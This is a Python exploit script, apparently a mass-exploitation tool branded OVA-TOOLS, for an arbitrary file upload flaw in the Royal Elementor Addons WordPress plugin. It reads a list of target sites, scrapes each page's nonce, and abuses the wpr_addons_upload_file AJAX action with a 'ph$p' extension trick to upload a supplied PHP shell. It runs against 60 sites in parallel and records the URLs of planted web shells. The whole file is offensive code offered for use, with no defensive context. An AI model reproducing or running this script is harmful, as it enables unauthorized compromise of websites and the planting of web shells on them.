import sys
import os
import uuid
import requests
import string
import random
from multiprocessing import Pool
import re
from colorama import Fore




fr = Fore.RED
fg = Fore.GREEN

banner = '''{}
           
[#] Create By ::

   ______      __       _______ ____   ____  _       _____ 
  / __ \ \    / /\     |__   __/ __ \ / __ \| |     / ____|
 | |  | \ \  / /  \ ______| | | |  | | |  | | |    | (___  
 | |  | |\ \/ / /\ \______| | | |  | | |  | | |     \___ \ 
 | |__| | \  / ____ \     | | | |__| | |__| | |____ ____) |
  \____/   \/_/    \_\    |_|  \____/ \____/|______|_____/ 
                          OVA-TOOLS  https://t.me/ovacloud  
                    File Upload Vulnerability in Royal Elementor                          
                                                 

\n'''.format(fr)


# Suppressing InsecureRequestWarning for disabling SSL verification
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

if len(sys.argv) != 3:
    sys.exit('Usage: {} <myuploaders.txt> <shellfile>'.format(os.path.basename(sys.argv[0])))

try:
    with open(sys.argv[1], 'r') as file:
        uploaders = [line.strip() for line in file.readlines()]
except FileNotFoundError:
    sys.exit('{} File does not exist'.format(sys.argv[1]))

select = sys.argv[2]

if not select:
    sys.exit("\n  [!] No shell file selected.")

def generate_random_string(length):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for _ in range(length))

def read_file(filename):
    with open(filename, 'rb') as file:
        return file.read()

def URLS(site):
    if site.startswith("http://"):
        site = site.replace("http://", "")
    elif site.startswith("https://"):
        site = site.replace("https://", "")
    if 'www.' in site:
        site = site.replace("www.", "")
    site = site.rstrip('/')
    return site

def WPNonce(sample_string):
    pattern = r'"nonce":"([^"]+)","comparePageID"|"nonce":"([^"]+)","addedToCartText"'
    nonce_match = re.search(pattern, sample_string)
    
    if nonce_match:
        nonce_value = nonce_match.group(1) if nonce_match.group(1) else nonce_match.group(2)
        return nonce_value
    else:
        return None

def post1(url):
    try:
        headers = {'User-Agent': "Mozilla/6.4 (Windows NT 11.1) Gecko/2010102 Firefox/99.0"}
        if not url.startswith("http://") and not url.startswith("https://"):
            url = "http://" + url
        site = f"https://{URLS(url)}"
        ajax_url = f"{site}/wp-admin/admin-ajax.php"
        getcontent = requests.get(site, headers=headers, verify=False, timeout=(20, 30)).text
        wpraddons_nonce = WPNonce(getcontent)
        
        if wpraddons_nonce is None:
            print(f"{fr} Target: {site} - Not Vuln ")
            return

        filename = str(uuid.uuid4()) + ".ph$p"
        content_files = read_file(select)
        unique_filename = "ova-tools-" + generate_random_string(8) + ".ph$p"  # Generate a unique filename

        #print(wpraddons_nonce)  
        data = {
            'action': 'wpr_addons_upload_file',
            'allowed_file_types': 'ph$p',
            'wpr_addons_nonce': wpraddons_nonce,
            'max_file_size': 100000,
            'triggering_event': 'click'
        }

        files = {
            'uploaded_file': (unique_filename, content_files, 'application/x-php')
        }

        response = requests.post(ajax_url, data=data, files=files, headers=headers, verify=False, timeout=(40, 60))

        if response.status_code == 200:
            response_data = response.json()
            #print(response_data)
            if 'success' in response_data and response_data['success']:
                print(f"{fg} Target: {site} Uploaded")
                if 'data' in response_data and 'url' in response_data['data']:
                    with open('result.txt', 'a') as file:
                         file.write(site + "/wp-content/uploads/wpr-addons/forms/" + unique_filename.replace('.ph$p', '.php') + "\n")
            else:  
                print(f"{fr} Target: {site}, Not Vuln")         
        else:  
            print(f"{fr} Target: {site}, Not Vuln")
    except Exception as Ex:
        print(f"{fr} Target: {site}, Not Vuln")





if __name__ == '__main__':
    pool = Pool(60)
    print(banner)
    pool.map(post1, uploaders)
    pool.close()
    pool.join()
